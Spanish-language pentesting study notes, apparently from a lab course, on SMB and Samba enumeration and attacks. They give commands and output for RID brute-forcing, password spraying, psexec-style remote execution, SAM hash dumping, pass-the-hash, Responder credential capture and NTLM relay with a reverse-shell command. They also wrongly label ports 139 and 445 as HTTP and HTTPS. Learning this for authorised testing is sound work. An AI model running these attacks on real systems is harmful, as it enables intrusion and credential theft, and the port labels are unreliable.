> El Server Message Block (SMB) es un protocolo cliente-servidor que regula el acceso a archivos, directorios completos y otros recursos de red, como impresoras, routers o interfaces compartidas en la red. El intercambio de información entre diferentes procesos del sistema también puede manejarse mediante el protocolo SMB.

Con el proyecto de software libre **Samba**, también existe una solución que permite el uso de SMB en distribuciones de Linux y Unix, posibilitando así la comunicación multiplataforma a través de SMB. Por defecto, se encuentra en los puertos `139` (HTTP) y `445` (HTTPS)

### Samba

Como se mencionó anteriormente, existe una implementación alternativa del servidor SMB llamada Samba, desarrollada para sistemas operativos basados en Unix. Samba implementa el protocolo de red **Common Internet File System (CIFS)**. CIFS es un dialecto de SMB, lo que significa que es una implementación específica del protocolo SMB creada originalmente por Microsoft. Esto permite que Samba se comunique de manera efectiva con sistemas Windows más recientes, por lo que a menudo se le conoce como **SMB/CIFS**.

Sabemos que Samba es compatible tanto con sistemas Linux como Windows. En una red, cada host participa en el mismo **grupo de trabajo** (_workgroup_). Un grupo de trabajo es un nombre que identifica un conjunto arbitrario de computadoras y sus recursos dentro de una red SMB. Puede haber varios grupos de trabajo en la red al mismo tiempo.

IBM desarrolló una **interfaz de programación de aplicaciones (API)** para la conexión en red de computadoras llamada **Network Basic Input/Output System (NetBIOS)**. La API de NetBIOS proporcionó un modelo para que una aplicación pudiera conectarse y compartir datos con otras computadoras. En un entorno NetBIOS, cuando una máquina se conecta a la red, necesita un nombre, lo cual se realiza a través de un procedimiento llamado **registro de nombre** (_name registration procedure_).

| Configuración                     | Descripción                                                               |
|------------------------------------|---------------------------------------------------------------------------|
| [sharename]                        | Nombre del recurso compartido en la red.                                 |
| workgroup = WORKGROUP/DOMAIN       | Grupo de trabajo que aparecerá cuando los clientes consulten.            |
| path = /path/here/                 | Directorio al que se le dará acceso al usuario.                          |
| server string = STRING             | Cadena que aparecerá cuando se inicie una conexión.                      |
| unix password sync = yes           | ¿Sincronizar la contraseña de UNIX con la de SMB?                        |
| usershare allow guests = yes       | ¿Permitir que usuarios no autenticados accedan al recurso compartido?    |
| map to guest = bad user            | ¿Qué hacer cuando una solicitud de inicio de sesión no coincide con un usuario válido de UNIX? |
| browseable = yes                   | ¿Debe mostrarse este recurso en la lista de recursos disponibles?        |
| guest ok = yes                     | ¿Permitir conexión sin necesidad de contraseña?                          |
| read only = yes                    | ¿Permitir solo lectura de archivos a los usuarios?                       |
| create mask = 0700                 | ¿Qué permisos se establecerán para los archivos recién creados?          |
### Configuración peligrosa

| Configuración             | Descripción                                                                 |
| ------------------------- | --------------------------------------------------------------------------- |
| browseable = yes          | ¿Permitir listar los recursos compartidos disponibles en el recurso actual? |
| read only = no            | ¿Prohibir la creación y modificación de archivos?                           |
| writable = yes            | ¿Permitir a los usuarios crear y modificar archivos?                        |
| guest ok = yes            | ¿Permitir conexión al servicio sin necesidad de contraseña?                 |
| enable privileges = yes   | ¿Respetar los privilegios asignados a un SID específico?                    |
| create mask = 0777        | ¿Qué permisos deben asignarse a los archivos recién creados?                |
| directory mask = 0777     | ¿Qué permisos deben asignarse a los directorios recién creados?             |
| logon script = script.sh  | ¿Qué script debe ejecutarse en el inicio de sesión del usuario?             |
| magic script = script.sh  | ¿Qué script debe ejecutarse cuando el script se cierra?                     |
| magic output = script.out | ¿Dónde debe almacenarse la salida del script mágico?                        |

### SMBclient - Conectando

El uso básico es este:

```bash
smbclient //SERVIDOR/RECURSO -U [DOMINIO\\]USUARIO[%PASSWORD]
```

Podemos especificar usuario y contraseña así:

```bash
smbclient //SERVIDOR/RECURSO --user usuario[%password]
### Ejemplo ###
smbclient //192.168.1.1/share --user='admin%admin$123'
```

La siguiente opción es sin especificar usuario:

```shell-session
amr251@htb[/htb]$ smbclient -N -L //10.129.14.128

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        home            Disk      INFREIGHT Samba
        dev             Disk      DEVenv
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled -- no workgroup available
```

Podemos ver que ahora tenemos cinco recursos compartidos diferentes en el servidor Samba a partir del resultado. Entre ellos, `print$` e `IPC$` ya están incluidos por defecto en la configuración básica, como ya hemos visto. Dado que estamos tratando con el recurso compartido `[notes]`, iniciemos sesión e inspeccionémoslo utilizando el mismo programa cliente. Si no estamos familiarizados con el programa cliente, podemos usar el comando `help` tras un inicio de sesión exitoso para listar todos los comandos posibles que podemos ejecutar.

### Descargando archivos desde SMB

```shell-session
smb: \> get prep-prod.txt 

getting file \prep-prod.txt of size 71 as prep-prod.txt (8,7 KiloBytes/sec) 
(average 8,7 KiloBytes/sec)
```

Desde el punto de vista administrativo, podemos verificar estas conexiones utilizando `smbstatus`. Además de la versión de Samba, también podemos ver quién está conectado, desde qué host y a qué recurso compartido. Por ejemplo, con la seguridad a nivel de dominio, el servidor Samba actúa como un miembro de un dominio de Windows. Cada dominio tiene al menos un controlador de dominio, que generalmente es un servidor Windows NT que proporciona autenticación de contraseñas. Este controlador de dominio ofrece al grupo de trabajo un servidor de contraseñas definitivo. Los controladores de dominio realizan un seguimiento de los usuarios y contraseñas en su propio `NTDS.dit` y el Módulo de Autenticación de Seguridad (SAM) y autentican a cada usuario cuando inician sesión por primera vez y desean acceder a un recurso compartido de otra máquina.

```shell-session
root@samba:~# smbstatus

Samba version 4.11.6-Ubuntu
PID     Username     Group        Machine                                   Protocol Version  Encryption           Signing              
----------------------------------------------------------------------------------------------------------------------------------------
75691   sambauser    samba        10.10.14.4 (ipv4:10.10.14.4:45564)      SMB3_11           -                    -                    

Service      pid     Machine       Connected at                     Encryption   Signing     
---------------------------------------------------------------------------------------------
notes        75691   10.10.14.4   Do Sep 23 00:12:06 2021 CEST     -            -           

No locked files
```

### RPCclient

El Llamado a Procedimiento Remoto (RPC) es un concepto y, por lo tanto, también una herramienta central para realizar estructuras operativas y de trabajo compartido en redes y arquitecturas cliente-servidor. El proceso de comunicación a través de RPC incluye el paso de parámetros y la devolución de un valor de función.

```shell-session
amr251@htb[/htb]$ rpcclient -U "" 10.129.14.128
```

El `rpcclient` nos ofrece muchas solicitudes diferentes con las cuales podemos ejecutar funciones específicas en el servidor SMB para obtener información.

| Consulta                | Descripción                                                     |
| ----------------------- | --------------------------------------------------------------- |
| srvinfo                 | Información del servidor.                                       |
| enumdomains             | Enumera todos los dominios desplegados en la red.               |
| querydominfo            | Proporciona información sobre el dominio, servidor y usuarios.  |
| netshareenumall         | Enumera todos los recursos compartidos disponibles.             |
| netsharegetinfo <share> | Proporciona información sobre un recurso compartido específico. |
| enumdomusers            | Enumera todos los usuarios del dominio.                         |
| queryuser <RID>         | Proporciona información sobre un usuario específico.            |

Sin embargo, también puede ocurrir que no todos los comandos estén disponibles para nosotros, ya que existen ciertas restricciones basadas en el usuario. No obstante, la consulta `queryuser <RID>` suele estar permitida en función del RID. Por ello, podemos utilizar `rpcclient` para forzar (bruteforce) los RIDs y obtener información. Dado que puede que no sepamos quién tiene asignado cada RID, sabemos que obtendremos información tan pronto como consultemos un RID asignado.

Existen varias maneras y herramientas que podemos usar para esto. Para quedarnos con la herramienta actual, podemos crear un bucle `for` en Bash en el que enviamos un comando al servicio usando `rpcclient` y filtramos los resultados.

```shell-session
amr251@htb[/htb]$ for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

        User Name   :   sambauser
        user_rid :      0x1f5
        group_rid:      0x201
		
        User Name   :   mrb3n
        user_rid :      0x3e8
        group_rid:      0x201
		
        User Name   :   cry0l1t3
        user_rid :      0x3e9
        group_rid:      0x201
```

### Otras herramientas

Existen múltiples herramientas para enumerar información, como [SMBMap](https://github.com/ShawnDEvans/smbmap) y [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)  

**SMBMap**

```shell-session
amr251@htb[/htb]$ smbmap -H 10.129.14.128

[+] Finding open SMB ports....
[+] User SMB session established on 10.129.14.128...
```

**CrackMapExec**

```shell-session
amr251@htb[/htb]$ crackmapexec smb 10.129.14.128 --shares -u '' -p ''

SMB         10.129.14.128   445    DEVSMB           [*] Windows 6.1 Build 0 (name:DEVSMB) (domain:) (signing:False) (SMBv1:False)
SMB         10.129.14.128   445    DEVSMB           [+] \: 
SMB         10.129.14.128   445    DEVSMB           [+] Enumerated shares
```

El uso general de esta herramienta es el siguiente:

```shell-session
amr251@htb[/htb]$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

Por ejemplo:

```bash
crackmapexec smb 10.129.62.212 -u "root" -p "123456" --shares
```

Si conseguimos obtener los shares, podríamos conectarnos usando `smbclient` 

```bash
smbclient -U user \\\\<target_IP>\\SHAREDRIVE
```

Otra herramienta interesante se llama [enum4linux-ng](https://github.com/cddmp/enum4linux-ng), que automatiza muchísimas consultas, devolviendo mucha información. Simplemente lo clonamos de github y con `pip3` en un entorno virtual, lo instalamos.

```shell-session
amr251@htb[/htb]$ git clone https://github.com/cddmp/enum4linux-ng.git
amr251@htb[/htb]$ cd enum4linux-ng
amr251@htb[/htb]$ pip3 install -r requirements.txt
amr251@htb[/htb]$ ./enum4linux-ng.py 10.129.14.128 -A
```

Recordar que para crear un entorno virtual en Python, se siguen estos pasos:

```bash
1. python3 -m venv venv
2. source venv/bin/activate
3. pip3 install <...>
```

Cuando terminemos, escribimos `deactivate`.

### Atacando SMB

Si encontramos un servidor SMB que no necesite de un usuario y contraseña o encontramos credenciales válidas, podemos obtener un listado de shares, usuarios, grupos, permisos, servicios, etc. La mayoría de herramientas que interactúan con SMB permiten conectividad con sesión nula, incluyendo `smbclient`, `smbmap`, `rpcclient` o `enum4linux`. Ya hemos visto más arriba el funcionamiento de estas herramientas, pero echemos un vistazo a flags específicos. Por ejemplo, usando `smbmap` con el flag `-r` o `-R` podemos buscar los directorios de forma recursiva. O si encontramos permisos de lectura y escritura, podemos descargar y subir archivos:

```shell-session
amr251@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"

[+] Starting download: notes\note.txt (116 bytes)
[+] File output to: /htb/10.129.14.128-notes_note.txt
```


```shell-session
amr251@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

[+] Starting upload: test.txt (20 bytes)
[+] Upload complete.
```

##### Remote Procedure Call (RPC)

Podemos usar `rpcclient` con una sesión nula para enumerar un workstation o controlador de dominio. A continuación se proporciona un cheatsheet: 

![[Pasted image 20250430103037.png | 800]]![[Pasted image 20250430103104.png | 1000]]

```shell-session
amr251@htb[/htb]$ rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers

user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

### Ataques específicos 

Si no hemos podido establecer una sesión nula, necesitaremos credenciales. Dos formas comunes de obtenerlas es o por fuerza bruta o por spray de contraseñas. Cuando usamos fuerza bruta, probamos todas las contraseñas contra una cuenta, pero puede bloquearnos si llegamos al límite, por lo que es más recomendable usar el segundo método. Es una mejor alternativa, pues podemos apuntar una lista de usuarios con una contraseña común para evitar bloqueos. 

Con CrackMapExec poder apuntar a múltiples IPs, usando varios usuarios y contraseñas. Para usar password spraying sobre una IP, podemos usar `-u` para especificar un archivo con una lista de usuarios y `-p` para especificar una contraseña.

```shell-session
amr251@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE 
SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE 

<SNIP>

SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!) 
```

### Ejecución remota de códigos (RCE)

PsExec es una herramienta que ejecuta procesos en otros sistemas, completa con total interactividad para aplicaciones de consola sin tener que instalar manualmente software cliente. Podemos descargarlo de [aquí](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) o usar implementaciones en Linux:
- [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py): Python PsExec usando RemComSvc
- [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py): Similar al anterior, pero va un paso más allá instalando un servidor local para recibir el output de los comandos. Esto es útil cuando la máquina objetivo no tiene un share con permisos de escritura disponible
- [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py):  Ejecuta un comando a través del administrador de tareas
- CrackMapExec
- Metasploit Exec
##### Impacket PsExec

Para usarlo necesitamos proporcionar el dominio/usuario, la contraseña y la IP de la máquina objetivo.

```bash
amr251@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
```

##### CrackMapExec

Una ventaja de esta herramienta es su disponibilidad para ejecutar un comando en múltiples hosts a la vez. Para usarlo, necesitamos especificar el protocolo, la dirección IP o rango, y las siguientes opciones:

```shell-session
amr251@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec
SMB         10.10.110.17 445    WIN7BOX  nt authority\system
```

##### Enumerando usuarios logueados

```shell-session
amr251@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

##### Extraer hashes de la BBDD SAM

Security Account Manager (SAM) es un archivo de BBDD que guarda las contraseñas de los usuarios. Se puede usar para autenticar usuarios locales y remotos. Si ganamos permisos admin de la máquina podemos extraer los hashes para diferentes propósitos:

- Autenticarnos como otro usuario
- Adivinar contraseñas, y si lo conseguimos, reusarlas para otros servicios o cuentas
- Pass the hash

```shell-session
amr251@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Dumping SAM hashes
SMB         10.10.110.17 445    WIN7BOX  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
SMB         10.10.110.17 445    WIN7BOX  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.110.17 445    WIN7BOX  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5717e1619e16b9179ef2e7138c749d65:::
SMB         10.10.110.17 445    WIN7BOX  jurena:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
SMB         10.10.110.17 445    WIN7BOX  demouser:1002:aad3b435b51404eeaad3b435b51404ee:4c090b2a4a9a78b43510ceec3a60f90b:::
SMB         10.10.110.17 445    WIN7BOX  [+] Added 6 SAM hashes to the database
```

##### Pass the Hash (PtH)

Consultar [[Pass the Hash]]. Si conseguimos el hash NTLM de un usuario, y no podemos adivinarlo, podemos usar su hash para autenticarnos sobre SMB con esta técnica, que permite a un atacante autenticarse a un servidor remoto o servicio remoto usando el hash NTLM en vez de su contraseña en claro. Podemos usarlo con cualquier herramienta de `Impacket`, SMBMap, CrackMapExec...

```shell-session
amr251@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)
```

##### Ataques forzados de autenticación

Podemos también abusar del protocolo SMB creando un servidor SMB falso para capturar hashes NTLM v1/2. La forma más común es usando `Responder`. 

```shell-session
amr251@htb[/htb]$ responder -I <interface name>
```

Cuando un usuario o sistema intenta realizar una **resolución de nombres (NR)**, la máquina sigue una serie de pasos para obtener la dirección IP de un host a partir de su nombre (hostname). En sistemas Windows, el procedimiento es aproximadamente el siguiente:

1. Se necesita la dirección IP del recurso compartido (hostname).    
2. Se consulta el archivo local de hosts: `C:\Windows\System32\Drivers\etc\hosts`.    
3. Si no se encuentra ningún registro allí, se revisa la **caché DNS local**, que almacena nombres resueltos recientemente.    
4. Si tampoco hay registros en la caché, se envía una consulta al **servidor DNS configurado**.    
5. Si todas las opciones anteriores fallan, se envía una **consulta por multidifusión (multicast)** a la red, solicitando a otras máquinas la IP del recurso compartido.

Supón que un usuario escribe mal el nombre de una carpeta compartida: `\\mysharefoder\` en lugar de `\\mysharedfolder\`. Como ese nombre no existe, todas las resoluciones de nombre fallan y la máquina termina enviando una consulta multicast a toda la red.

Este comportamiento presenta un problema de seguridad: **no se valida la integridad de las respuestas**. Un atacante podría interceptar la consulta, falsificar una respuesta (spoofing) y hacer que la víctima confíe en un servidor malicioso. Esto suele usarse para **robar credenciales**.

```shell-session
amr251@htb[/htb]$ sudo responder -I ens33

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

...SNIP...

[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser:win7box:(...)

```

Las credenciales capturadas pueden ser:

- **Descifradas (crackeadas)** utilizando herramientas como `hashcat`.    
- **Reenviadas (relayed)** a un host remoto para completar la autenticación y **suplantar al usuario**.    

Todos los _hashes_ guardados se almacenan en el directorio de logs de **Responder**:  
`/usr/share/responder/logs/`

Podemos copiar un _hash_ a un archivo y usar `hashcat` con el módulo **5600** para intentar crackearlo.

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Si no logramos descifrarlo, podemos **reutilizar (relay)** el hash capturado para autenticarnos en otra máquina. Para esto, podemos usar:

- [`impacket-ntlmrelayx`](https://github.com/fortra/impacket)    
- `Responder` con el script `MultiRelay.py`    

**Ejemplo con `impacket-ntlmrelayx`**

**Paso 1:** Desactivar SMB en la configuración de Responder  - Archivo: `/etc/responder/Responder.conf`. Esto evita conflictos, ya que `Responder` y `ntlmrelayx` no pueden usar el mismo puerto SMB al mismo tiempo.

```shell-session
amr251@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

Entonces, ejecutamos `impacket-ntlmrelayx` con la opción `--no-http-server`, `-smb2support` y la IP de la máquina objetivo con la opción `-t`. Por defecto, dumpeará la BBDD SAM, pero podemos ejecutar comandos con el flag `-c`.

```shell-session
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

Podemos crear una Reverse Shell usando [https://www.revshells.com/](https://www.revshells.com/), poner nuestra IP y puerto y la opción de PowerShell Base64. 

```shell-session
amr251@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e ...'
```

##### RPC

Además de autenticarnos, podemos usar RPC para hacer cambios en el sistema, como cambiar la contraseña de un usuario, crear un nuevo dominio o una nueva carpeta compartida. 

### Enumeración de shares con netexec

Existe otra forma de enumerar shares con esta herramienta. El proceso es muy sencillo si no es necesario el uso de una contraseña. Primero, utilizamos `enum4linux-ng` para obtener el FQDN de un equipo:

```bash
enum4linux-ng 192.168.0.72

...SNIP...

[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: LELE                                                    
NetBIOS domain name: ''                                                        
DNS domain: LELE                                                               
FQDN: LELE                                                                     
Derived membership: workgroup member                                           
Derived domain: unknown   
```

En este caso, es LELE. Ahora usamos netxec:

```bash
nxc smb 192.168.0.72 -u 'lele' -p '' --shares
SMB         192.168.0.72    445    LELE             [*] Windows 10 / Server 2019 Build 19041 x64 (name:LELE) (domain:LELE) (signing:False) (SMBv1:False)
SMB         192.168.0.72    445    LELE             [+] LELE\lele: (Guest)
SMB         192.168.0.72    445    LELE             [*] Enumerated shares
SMB         192.168.0.72    445    LELE             Share           Permissions     Remark
SMB         192.168.0.72    445    LELE             -----           -----------     ------
SMB         192.168.0.72    445    LELE             ADMIN$                          Admin remota
SMB         192.168.0.72    445    LELE             C$                              Recurso predeterminado                                                                                        
SMB         192.168.0.72    445    LELE             D$                              Recurso predeterminado                                                                                        
SMB         192.168.0.72    445    LELE             Intercambio     READ,WRITE      
SMB         192.168.0.72    445    LELE             IPC$            READ            IPC remota
```